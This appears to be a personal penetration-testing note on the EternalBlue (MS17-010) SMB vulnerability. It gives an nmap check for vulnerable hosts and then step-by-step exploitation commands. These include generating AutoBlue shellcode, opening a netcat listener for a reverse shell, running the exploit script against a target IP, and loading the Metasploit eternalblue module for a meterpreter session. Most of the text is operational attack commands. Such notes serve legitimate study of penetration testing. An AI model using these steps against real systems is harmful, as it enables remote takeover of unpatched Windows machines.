
A vuln on SMB (tcp 445) that allows access to a Windows System
Its an RCE Vuln and was developed by NSA
It automatically gives the hacker elevated privileges
It was used by WannaCry ransomware

Affects Windows Vista, 7, 2008, 8.1, 2012 and 2016 and 10 in both x32.x64 and x86

We can use [[Metasploit]] or Autoblue-MS17-010

We  can use an nmap script to check if the target is vulnerable:

``` bash
nmap -sV -p 445 --script=smb-vuln-ms17-010 [IP]
```

Then we can install autoblue or use metasploit, for autoblue we first need to generate the shellcode:

(In Autoblue)

``` bash
cd shellcode
chmod +x shell_prep.sh
./shell.sh
y
```

Then follow instructions (providing IPs, ports and etc)(generate a stageless payload)

![[msf_autoblueshellcode.png]]

Then we set our netcat listener:

``` bash
netcat -nlvp [Lport]
```

Then we run in autoblue:

``` bash
python eternalblue_eploit7.py [IP] [shellcodepath]
```

And we should get a command shell

---

When doing it with [[Metasploit]]:

We can use the auxiliary module to see if the system is vulnerable or the exploit module 

``` bash
use /exploit/windows/smb/ms17_010_eternalblue
```

Set RHOSTS etc. and run with "exploit" we will get a meterpreter session NOT a windows shell.